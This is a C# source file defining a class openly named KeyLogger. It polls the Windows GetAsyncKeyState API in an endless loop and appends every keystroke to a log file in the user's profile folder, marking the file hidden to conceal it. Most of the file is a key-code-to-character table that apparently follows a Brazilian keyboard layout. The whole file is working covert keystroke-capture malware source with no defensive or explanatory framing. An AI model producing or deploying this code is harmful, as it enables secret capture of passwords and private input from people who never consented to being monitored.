﻿using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Win32InputManipulations
{
    public static class KeyLogger
    {
        public static string Path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\KeyLog.txt";

        public static void StartProcess()
        {
            if (File.Exists(Path))
            {
                File.SetAttributes(Path, FileAttributes.Hidden);
            }
            else
            {
                File.Create(Path).Dispose();
                File.SetAttributes(Path, FileAttributes.Hidden);
            }

            while (true)
            {
                for (var i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key is 1 or -32767)
                    {
                        using var file = new StreamWriter(Path, true);
                        File.SetAttributes(Path, FileAttributes.Hidden);
                        file.Write(VerifyKey(i));
                        file.Close();
                        break;
                    }
                }
            }
        }

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int i);

        private static string VerifyKey(int code)
        {
            string key;
            switch (code)
            {
                case 8:
                    key = "[Back]";
                    break;

                case 9:
                    key = "[TAB]";
                    break;

                case 13:
                    key = "[Enter]";
                    break;

                case 19:
                    key = "[Pause]";
                    break;

                case 20:
                    key = "[Caps Lock]";
                    break;

                case 27:
                    key = "[Esc]";
                    break;

                case 32:
                    key = "[Space]";
                    break;

                case 33:
                    key = "[Page Up]";
                    break;

                case 34:
                    key = "[Page Down]";
                    break;

                case 35:
                    key = "[End]";
                    break;

                case 36:
                    key = "[Home]";
                    break;

                case 37:
                    key = "Left]";
                    break;

                case 38:
                    key = "[Up]";
                    break;

                case 39:
                    key = "[Right]";
                    break;

                case 40:
                    key = "[Down]";
                    break;

                case 44:
                    key = "[Print Screen]";
                    break;

                case 45:
                    key = "[Insert]";
                    break;

                case 46:
                    key = "[Delete]";
                    break;

                case 48:
                    key = "0";
                    break;

                case 49:
                    key = "1";
                    break;

                case 50:
                    key = "2";
                    break;

                case 51:
                    key = "3";
                    break;

                case 52:
                    key = "4";
                    break;

                case 53:
                    key = "5";
                    break;

                case 54:
                    key = "6";
                    break;

                case 55:
                    key = "7";
                    break;

                case 56:
                    key = "8";
                    break;

                case 57:
                    key = "9";
                    break;

                case 65:
                    key = "a";
                    break;

                case 66:
                    key = "b";
                    break;

                case 67:
                    key = "c";
                    break;

                case 68:
                    key = "d";
                    break;

                case 69:
                    key = "e";
                    break;

                case 70:
                    key = "f";
                    break;

                case 71:
                    key = "g";
                    break;

                case 72:
                    key = "h";
                    break;

                case 73:
                    key = "i";
                    break;

                case 74:
                    key = "j";
                    break;

                case 75:
                    key = "k";
                    break;

                case 76:
                    key = "l";
                    break;

                case 77:
                    key = "m";
                    break;

                case 78:
                    key = "n";
                    break;

                case 79:
                    key = "o";
                    break;

                case 80:
                    key = "p";
                    break;

                case 81:
                    key = "q";
                    break;

                case 82:
                    key = "r";
                    break;

                case 83:
                    key = "s";
                    break;

                case 84:
                    key = "t";
                    break;

                case 85:
                    key = "u";
                    break;

                case 86:
                    key = "v";
                    break;

                case 87:
                    key = "w";
                    break;

                case 88:
                    key = "x";
                    break;

                case 89:
                    key = "y";
                    break;

                case 90:
                    key = "z";
                    break;

                case 91:
                case 92:
                    key = "[Windows]";
                    break;

                case 93:
                    key = "[List]";
                    break;

                case 96:
                    key = "0";
                    break;

                case 97:
                    key = "1";
                    break;

                case 98:
                    key = "2";
                    break;

                case 99:
                    key = "3";
                    break;

                case 100:
                    key = "4";
                    break;

                case 101:
                    key = "5";
                    break;

                case 102:
                    key = "6";
                    break;

                case 103:
                    key = "7";
                    break;

                case 104:
                    key = "8";
                    break;

                case 105:
                    key = "9";
                    break;

                case 106:
                    key = "*";
                    break;

                case 107:
                    key = "+";
                    break;

                case 109:
                    key = "-";
                    break;

                case 110:
                    key = ",";
                    break;

                case 111:
                    key = "/";
                    break;

                case 112:
                    key = "[F1]";
                    break;

                case 113:
                    key = "[F2]";
                    break;

                case 114:
                    key = "[F3]";
                    break;

                case 115:
                    key = "[F4]";
                    break;

                case 116:
                    key = "[F5]";
                    break;

                case 117:
                    key = "[F6]";
                    break;

                case 118:
                    key = "[F7]";
                    break;

                case 119:
                    key = "[F8]";
                    break;

                case 120:
                    key = "[F9]";
                    break;

                case 121:
                    key = "[F10]";
                    break;

                case 122:
                    key = "[F11]";
                    break;

                case 123:
                    key = "[F12]";
                    break;

                case 144:
                    key = "[Num Lock]";
                    break;

                case 145:
                    key = "[Scroll Lock]";
                    break;

                case 160:
                case 161:
                    key = "[Shift]";
                    break;

                case 162:
                case 163:
                    key = "[Ctrl]";
                    break;

                case 164:
                case 165:
                    key = "[Alt]";
                    break;

                case 187:
                    key = "=";
                    break;

                case 186:
                    key = "ç";
                    break;

                case 188:
                    key = ",";
                    break;

                case 189:
                    key = "-";
                    break;

                case 190:
                    key = ".";
                    break;

                case 192:
                    key = "'";
                    break;

                case 191:
                    key = ";";
                    break;

                case 193:
                    key = "/";
                    break;

                case 194:
                    key = ".";
                    break;

                case 219:
                    key = "´";
                    break;

                case 220:
                    key = "]";
                    break;

                case 221:
                    key = "[";
                    break;

                case 222:
                    key = "~";
                    break;

                case 226:
                    key = "\\";
                    break;

                default:
                    key = "[" + code + "]";
                    break;
            }

            return key;
        }
    }
}